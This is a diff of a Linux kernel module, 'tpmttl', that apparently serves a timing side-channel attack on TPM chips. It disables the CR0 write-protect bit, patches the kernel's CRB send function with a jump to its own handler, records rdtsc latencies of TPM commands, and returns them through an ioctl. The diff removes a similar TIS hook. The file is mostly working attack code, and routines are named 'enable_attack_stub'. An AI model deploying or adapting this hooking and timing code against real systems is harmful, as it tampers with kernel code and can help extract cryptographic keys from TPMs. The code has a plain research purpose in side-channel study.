@@ -5,41 +5,36 @@
 #include <linux/fs.h>
 #include "tpmttl.h"
 
-unsigned long long crb_send            = 0xffffffff81643d20;
-unsigned long long tpm_tcg_write_bytes = 0xffffffff81642b40;
+unsigned long long pcrb_send = 0xffffffff81643d20;
 
-unsigned char nop_stub[]  = {0x90, 0x90, 0x90, 0x90, 0x90};
+unsigned char  nop_stub[] = {0x90, 0x90, 0x90, 0x90, 0x90};
 unsigned char call_stub[] = {0xe8, 0xf1, 0xf2, 0xf3, 0xf4};
-unsigned char jmp_stub[]  = {0xe9, 0xf1, 0xf2, 0xf3, 0xf4};
+unsigned char  jmp_stub[] = {0xe9, 0xf1, 0xf2, 0xf3, 0xf4};
 
+enum crb_defaults {
+	CRB_ACPI_START_REVISION_ID = 1,
+	CRB_ACPI_START_INDEX = 1,
+};
 
-/*
-  For CRB
- */
-// enum crb_defaults {
-// 	CRB_ACPI_START_REVISION_ID = 1,
-// 	CRB_ACPI_START_INDEX = 1,
-// };
+enum crb_loc_ctrl {
+	CRB_LOC_CTRL_REQUEST_ACCESS	= BIT(0),
+	CRB_LOC_CTRL_RELINQUISH		= BIT(1),
+};
 
-// enum crb_loc_ctrl {
-// 	CRB_LOC_CTRL_REQUEST_ACCESS	= BIT(0),
-// 	CRB_LOC_CTRL_RELINQUISH		= BIT(1),
-// };
-
-// enum crb_loc_state {
-// 	CRB_LOC_STATE_LOC_ASSIGNED	= BIT(1),
-// 	CRB_LOC_STATE_TPM_REG_VALID_STS	= BIT(7),
-// };
+enum crb_loc_state {
+	CRB_LOC_STATE_LOC_ASSIGNED	= BIT(1),
+	CRB_LOC_STATE_TPM_REG_VALID_STS	= BIT(7),
+};
 
 enum crb_ctrl_req {
 	CRB_CTRL_REQ_CMD_READY	= BIT(0),
 	CRB_CTRL_REQ_GO_IDLE	= BIT(1),
 };
 
-// enum crb_ctrl_sts {
-// 	CRB_CTRL_STS_ERROR	= BIT(0),
-// 	CRB_CTRL_STS_TPM_IDLE	= BIT(1),
-// };
+enum crb_ctrl_sts {
+	CRB_CTRL_STS_ERROR	= BIT(0),
+	CRB_CTRL_STS_TPM_IDLE	= BIT(1),
+};
 
 enum crb_start {
 	CRB_START_INVOKE	= BIT(0),
@@ -48,7 +43,6 @@ enum crb_start {
 enum crb_cancel {
 	CRB_CANCEL_INVOKE	= BIT(0),
 };
-
 
 struct crb_regs_head {
 	u32 loc_state;
@@ -98,62 +92,6 @@ struct fake_chip {
 struct fake_crb_priv * g_priv;
 struct fake_chip * g_chip;
 
-/*
-  For TIS
- */
-
-enum tis_status {
-	TPM_STS_VALID = 0x80,
-	TPM_STS_COMMAND_READY = 0x40,
-	TPM_STS_GO = 0x20,
-	TPM_STS_DATA_AVAIL = 0x10,
-	TPM_STS_DATA_EXPECT = 0x08,
-	TPM_STS_RESPONSE_RETRY = 0x02,
-	TPM_STS_READ_ZERO = 0x23,
-};
-
-enum tpm_tis_io_mode {
-	TPM_TIS_PHYS_8,
-	TPM_TIS_PHYS_16,
-	TPM_TIS_PHYS_32,
-};
-
-struct tpm_tis_phy_ops {
-	int (*read_bytes)(struct tpm_tis_data *data, u32 addr, u16 len,
-			  u8 *result, enum tpm_tis_io_mode mode);
-	int (*write_bytes)(struct tpm_tis_data *data, u32 addr, u16 len,
-			   const u8 *value, enum tpm_tis_io_mode mode);
-	int (*verify_crc)(struct tpm_tis_data *data, size_t len,
-			  const u8 *value);
-};
-
-struct tpm_tis_data {
-	struct tpm_chip *chip;
-	u16 manufacturer_id;
-	struct mutex locality_count_mutex;
-	unsigned int locality_count;
-	int locality;
-	int irq;
-	struct work_struct free_irq_work;
-	unsigned long last_unhandled_irq;
-	unsigned int unhandled_irqs;
-	unsigned int int_mask;
-	unsigned long flags;
-	void __iomem *ilb_base_addr;
-	u16 clkrun_enabled;
-	wait_queue_head_t int_queue;
-	wait_queue_head_t read_queue;
-	const struct tpm_tis_phy_ops *phy_ops;
-	unsigned short rng_quality;
-	unsigned int timeout_min;
-	unsigned int timeout_max;
-};
-
-struct tpm_tis_tcg_phy {
-  struct tpm_tis_data priv;
-  void __iomem *iobase;
-};
-
 #define	TPM_STS(l)			(0x0018 | ((l) << 12))
 
 enum tpm_chip_flags {
@@ -163,11 +101,9 @@ enum tpm_chip_flags {
   TPM_CHIP_FLAG_VIRTUAL		= BIT(3),
 };
 
+
 static noinline int internal_crb_send_handler(uint64_t * chip, u8 *buf, size_t len);
 static int crb_send_handler(uint64_t *chip, u8 *buf, size_t len);
-
-static noinline int internal_tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, u8 *value);
-static int tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, u8 *value);
 
 unsigned long long tscrequest[1000] = {0};
 unsigned long long requestcnt = 0;
@@ -176,49 +112,46 @@ unsigned long long requestcnt = 0;
 static void enable_attack_stub()
 {
   requestcnt = 0;
-  
   unsigned int target_addr;  
-  write_cr0 (read_cr0 () & (~ 0x10000));
+  write_cr0(read_cr0() & (~X86_CR0_WP));
 
-  target_addr = crb_send_handler - crb_send - 5;  
+  target_addr = crb_send_handler - pcrb_send - 5;  
   jmp_stub[1] = ((char*)&target_addr)[0];
   jmp_stub[2] = ((char*)&target_addr)[1];
   jmp_stub[3] = ((char*)&target_addr)[2];
   jmp_stub[4] = ((char*)&target_addr)[3];
-  memcpy((void*)crb_send, jmp_stub, sizeof(jmp_stub));
+  memcpy((void*)pcrb_send, jmp_stub, sizeof(jmp_stub));
 
-  target_addr = tpm_tcg_write_bytes_handler - tpm_tcg_write_bytes - 5;  
-  jmp_stub[1] = ((char*)&target_addr)[0];
-  jmp_stub[2] = ((char*)&target_addr)[1];
-  jmp_stub[3] = ((char*)&target_addr)[2];
-  jmp_stub[4] = ((char*)&target_addr)[3];
-  memcpy((void*)tpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));
-
-  write_cr0 (read_cr0 () | 0x10000);
+  write_cr0(read_cr0() | X86_CR0_WP); 
  
   printk("TPMTTL: ENABLED\n");
 }
 
 static void disable_attack_stub()
 {  
-  write_cr0 (read_cr0 () & (~ 0x10000));
-  memcpy((void*)crb_send, nop_stub, sizeof(nop_stub));  
-  memcpy((void*)tpm_tcg_write_bytes, nop_stub, sizeof(nop_stub));
-  write_cr0 (read_cr0 () | 0x10000);
+  write_cr0(read_cr0() & (~X86_CR0_WP));
+
+  memcpy((void*)pcrb_send, nop_stub, sizeof(nop_stub));  
+
+  write_cr0(read_cr0() | X86_CR0_WP); 
+
   printk("TPMTTL: DISABLED\n");
 }
 
-static long ioctl_uninstall_timer(struct file *filep, unsigned int cmd, unsigned long arg) {
+static long ioctl_uninstall_timer(struct file *filep, unsigned int cmd, unsigned long arg)
+{
   disable_attack_stub();
   return 0;
 }
 
-static long ioctl_install_timer(struct file *filep, unsigned int cmd, unsigned long arg) {
+static long ioctl_install_timer(struct file *filep, unsigned int cmd, unsigned long arg)
+{
   enable_attack_stub();
   return 0;
 }
 
-static long ioctl_read(struct file *filep, unsigned int cmd, unsigned long arg) {
+static long ioctl_read(struct file *filep, unsigned int cmd, unsigned long arg)
+{
   struct tpmttl_generic_param *param = (struct tpmttl_generic_param *)arg;
   memcpy(param->ttls, tscrequest, 1000 * sizeof(unsigned long long));
   param->cnt = requestcnt;
@@ -229,11 +162,8 @@ static long ioctl_read(struct file *filep, unsigned int cmd, unsigned long arg) 
   return 0;
 }
 
-typedef long (*tpmttl_ioctl_t)(struct file *filep,
-	unsigned int cmd, unsigned long arg);
-
-long tpmttl_ioctl(struct file *filep, unsigned int cmd, 
-	unsigned long arg)
+typedef long (*tpmttl_ioctl_t)(struct file *filep, unsigned int cmd, unsigned long arg);
+long tpmttl_ioctl(struct file *filep, unsigned int cmd, unsigned long arg)
 {
   struct tpmttl_generic_param data;
   long ret;
@@ -266,50 +196,10 @@ long tpmttl_ioctl(struct file *filep, unsigned int cmd,
   return ret;
 }
 
-static const struct file_operations tpmttl_fops = {
-  .owner = THIS_MODULE,
-  .unlocked_ioctl = tpmttl_ioctl,
-};
 
-static struct miscdevice tpmttl_miscdev = {
-  .minor = MISC_DYNAMIC_MINOR,
-  .name = "tpmttl",
-  .fops = &tpmttl_fops,
-};
-
-static noinline int internal_tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, u8 *value)
+static noinline int internal_crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len)
 {
-  unsigned long i, t;
-  struct tpm_tis_tcg_phy *phy = container_of(data, struct tpm_tis_tcg_phy, priv);
-  if(len == 1 && *value == TPM_STS_GO && TPM_STS(data->locality) == addr)
-  {
-    wmb();
-    t = rdtsc();
-    rmb();
-    iowrite8(*value, phy->iobase + addr);
-
-    while(!(ioread8(phy->iobase + addr) & TPM_STS_DATA_AVAIL));
-    
-    rmb();
-
-    tscrequest[requestcnt++] = rdtsc() - t;
-  
-  }
-  else{
-    while (len--)
-      iowrite8(*value++, phy->iobase + addr);
-  }
-  return 0;
-}
-
-static int  tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, u8 *value)
-{
-  return internal_tpm_tcg_write_bytes_handler(data, addr, len, value);
-}
-
-static noinline int internal_crb_send_handler(uint64_t * chip, u8 *buf, size_t len){
   unsigned long t;
-  int rc = 0;
   asm volatile("mov %%rdi, %%r8;": : : "%r8");
   asm volatile("mov %%rsi, %%r9;": : : "%r9");
 
@@ -335,13 +225,26 @@ static noinline int internal_crb_send_handler(uint64_t * chip, u8 *buf, size_t l
   asm volatile("mov %%r8, %%rdi;": : : "%r8");
   asm volatile("mov %%r9, %%rsi;": : : "%r9");
 
-  return rc;
+  return 0;
 }
 
-static int crb_send_handler(uint64_t *chip, u8 *buf, size_t len)
+
+static int crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len)
 {
   return internal_crb_send_handler(chip, buf, len);
-} 
+}
+
+
+static const struct file_operations tpmttl_fops = {
+  .owner = THIS_MODULE,
+  .unlocked_ioctl = tpmttl_ioctl,
+};
+
+static struct miscdevice tpmttl_miscdev = {
+  .minor = MISC_DYNAMIC_MINOR,
+  .name = "tpmttl",
+  .fops = &tpmttl_fops,
+};
 
 
 static int tpmttl_init(void)
